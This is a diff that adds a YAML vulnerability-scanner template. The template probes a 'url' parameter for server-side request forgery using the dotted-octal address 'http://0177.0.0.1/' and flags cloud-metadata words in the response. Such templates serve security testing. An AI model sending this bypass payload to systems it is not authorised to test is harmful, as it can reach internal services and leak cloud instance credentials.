@@ -1,0 +1,22 @@
+id: patt-ssrf-oct-01-url
+name: 'PATT ssrf patt-ssrf-oct-01 via url'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - encodeoctal
+description: 'PATT dotted octal 127.0.0.1. [patt:patt-ssrf-oct-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      url:
+        - 'http://0177.0.0.1/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
